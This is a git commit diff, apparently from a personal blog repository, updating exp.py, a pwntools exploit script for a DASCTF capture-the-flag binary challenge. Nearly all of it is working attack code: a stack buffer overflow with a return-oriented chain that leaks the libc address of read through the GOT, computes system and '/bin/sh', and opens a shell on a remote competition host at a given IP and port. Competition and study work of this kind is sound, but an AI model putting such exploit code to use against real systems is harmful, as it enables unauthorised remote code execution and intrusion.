f8a6b6647438eaff83def69f7434d69779306e65
root <root@localhost.localdomain>
2020-04-25 18:35:32 +0800

    Site updated: 2020-04-25 18:35:30

--- 2020/04/25/Competition/DASCTF/test/exp.py
+++ 2020/04/25/Competition/DASCTF/test/exp.py
@@ -1,15 +1,18 @@
 from pwn import*
 context.log_level ='DEBUG'
 p = process('./main')
-#p = remote('183.129.189.60',10039)
+p = remote('183.129.189.60',10039)
 elf =ELF('./main')
 libc =ELF('./libc-2.27.so')
+pop_rdi_ret = 0x400823
+ret = 0x40055E
 p.sendlineafter('name: ',str(0x100))
-payload ='\x00'*0x88 + p64(0x400823) + p64(elf.got['read']) + p64(elf.plt['printf']) + p64(0x400769)
-gdb.attach(p)
-p.sendlineafter('name?',payload)
-libc.address = u64(p.recv(6).ljust(8,'\x00')) - libc.sym['read']
-p.interactive()
+payload ='\x00'*0x80 + p64(elf.bss()  + 0x800) + p64(pop_rdi_ret) + p64(elf.got['read']) + p64(0x4006F3)
+p.sendafter('name?',payload)
+libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['read']
+system = libc_base + libc.sym['system']
+binsh =  libc_base + libc.search('/bin/sh').next()
+log.info('LIBC:\t' + hex(libc.address))
 p.sendline(str(0x100))
-p.sendline('A'*0x88 + p64(0x400823) + p64(libc.search('/bin/sh').next) + p64(libc.sym['system']))
+p.sendlineafter('you name?','U'*0x88 + p64(ret) + p64(pop_rdi_ret) + p64(binsh) + p64(system))
 p.interactive()
